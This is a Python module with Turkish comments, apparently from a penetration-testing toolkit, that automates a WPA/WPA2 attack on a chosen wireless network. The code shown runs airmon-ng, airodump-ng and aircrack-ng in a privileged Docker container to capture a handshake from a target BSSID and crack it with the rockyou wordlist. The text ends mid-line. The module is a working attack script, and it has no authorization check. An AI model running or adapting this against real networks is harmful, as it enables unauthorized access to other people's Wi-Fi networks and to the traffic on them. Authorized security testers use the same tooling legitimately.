import os
import time
from docker_helper import run_command_in_docker

def run_wireless_tests(interface, bssid, channel, output_dir, image_name):
    """
    Belirtilen kablosuz ağ üzerinde WPA/WPA2 handshake yakalama ve kırma denemesi yapar.
    GEREKSİNİMLER: Monitor mod destekli Wi-Fi kartı, fiziksel yakınlık ve root yetkileri.

    Args:
        interface (str): Kullanılacak kablosuz ağ arayüzü (örn: "wlan0").
        bssid (str): Hedef ağın BSSID'si (MAC adresi).
        channel (str): Hedef ağın çalıştığı kanal.
        output_dir (str): Çıktıların kaydedileceği dizin.
        image_name (str): Kullanılacak Docker imajı.
    """
    print("\n[+] Kablosuz Ağ Testleri modülü başlatılıyor...")
    print("[!] UYARI: Bu modül, donanımınıza doğrudan erişim için Docker'ı yetkili modda çalıştıracaktır.")

    # Donanıma erişim için Docker'a --privileged yetkisi veriyoruz.
    # --net=host zaten helper'da var, bu da ağ kartlarını görmesi için gerekli.
    docker_privileged_args = ['--privileged']
    
    # Arayüz monitör moduna geçince genellikle 'mon' eki alır ( örn: wlan0mon )
    monitor_interface = f"{interface}mon"

    # Monitör modunu başlat, handshake yakala, kırmayı dene ve monitör modunu kapat.
    # Komutları ayrı ayrı çalıştırarak süreci daha kontrol edilebilir hale getiriyoruz.
    
    # 1. Monitör modunu başlat
    print(f"[i] Arayüz '{interface}' monitor moduna alınıyor...")
    start_monitor_command = f"airmon-ng start {interface}"
    run_command_in_docker(start_monitor_command, os.path.join(output_dir, "airmon_start_ciktisi.txt"), image_name, docker_privileged_args)
    
    # 2. Handshake yakala (90 saniye boyunca dinle)
    print(f"[i] Hedef ağ dinleniyor ({bssid}). Handshake yakalamak için 90 saniye bekleniyor...")
    print("[i] Bu sırada hedef ağa bir cihazın bağlanması gerekmektedir.")
    capture_command = f"timeout 90 airodump-ng -c {channel} --bssid {bssid} -w /output/handshake_capture {monitor_interface}"
    run_command_in_docker(capture_command, os.path.join(output_dir, "airodump_capture_ciktisi.txt"), image_name, docker_privileged_args)
    
    # 3. Yakalanan handshake'i kırmayı dene
    # Kali'de yaygın olarak bulunan rockyou.txt wordlist'ini kullanıyoruz.
    print("[i] Yakalanan handshake üzerinde parola kırma denemesi başlatılıyor...")
    crack_command = f"aircrack-ng -w /usr/share/wordlists/rockyou.txt -b {bssid} /output/handshake_capture*.cap"
    run_command_in_docker(crack_command, os.path.join(output_dir, "aircrack_crack_ciktisi.txt"), image_name, docker_privileged_args)

    # 4. Monitör modunu kapat (Temizlik)
    print(f"[i] Arayüz '{monitor_interface}' normal moda döndürülüyor...")
    stop_monitor_command = f"airmon-ng stop {monitor_interface}"
    run_command_in